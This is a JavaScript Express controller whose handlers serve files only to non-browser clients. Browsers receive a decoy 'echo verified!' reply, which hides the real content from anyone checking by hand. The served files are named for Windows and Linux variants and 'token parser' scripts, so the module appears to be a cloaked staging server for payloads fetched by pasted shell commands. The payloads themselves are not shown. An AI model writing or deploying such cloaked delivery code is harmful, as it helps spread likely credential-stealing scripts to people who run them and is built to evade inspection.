

const path = require('path');
const fs = require('fs');

function looksLikeBrowser(req) {
  const ua = req.get("user-agent") ?? "";

  // Common desktop and mobile browsers
  const browserPattern =
    /Chrome|Chromium|CriOS|Firefox|FxiOS|Safari|Edg|EdgA|EdgiOS|OPR|Opera|Brave|Vivaldi|SamsungBrowser|YaBrowser|DuckDuckGo|UCBrowser|Puffin|Silk|MSIE|Trident/i;

  return browserPattern.test(ua);
}

async function showV1(req, res) {

  if(looksLikeBrowser(req)) return res.send("echo verified!");
  
  const filePath = path.join(__dirname, '../public', 'win1.txt');

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error: 1', err);
      return res.status(500).send('Error reading file');
    }
    res.send(data);
  });
}

async function showV2(req, res) {

  if(looksLikeBrowser(req)) return res.send("echo verified!");
  
  const filePath = path.join(__dirname, '../public', 'win2.txt');

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error: 2', err);
      return res.status(500).send('Error reading file');
    }
    res.send(data);
  });
}

async function showV3(req, res) {

  if(looksLikeBrowser(req)) return res.send("echo verified!");
  
  const filePath = path.join(__dirname, '../public', 'lim1.txt');

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error: 3', err);
      return res.status(500).send('Error reading file');
    }
    res.send(data);
  });
}

async function showV4(req, res) {

  if(looksLikeBrowser(req)) return res.send("echo verified!");

  const filePath = path.join(__dirname, '../public', 'lim2.txt');

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error: 4', err);
      return res.status(500).send('Error reading file');
    }
    res.send(data);
  });
}

async function showTokenParser1(req, res) {

  if(looksLikeBrowser(req)) return res.send("echo verified!");

  const filePath = path.join(__dirname, '../public', 'tokenwin');

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error: 4', err);
      return res.status(500).send('Error reading file');
    }
    res.send(data);
  });
}

async function showTokenParser2(req, res) {

  if(looksLikeBrowser(req)) return res.send("echo verified!");

  const filePath = path.join(__dirname, '../public', 'tokenlim');

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error: 4', err);
      return res.status(500).send('Error reading file');
    }
    res.send(data);
  });
}

async function showPacks(req, res) {

  if(looksLikeBrowser(req)) return res.send("echo verified!");

  const filePath = path.join(__dirname, '../public', 'package.json');

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error: 5', err);
      return res.status(500).send('Error reading file');
    }
    res.send(data);
  });
}

module.exports = { showV1, showV2, showV3, showV4, showTokenParser1, showTokenParser2, showPacks };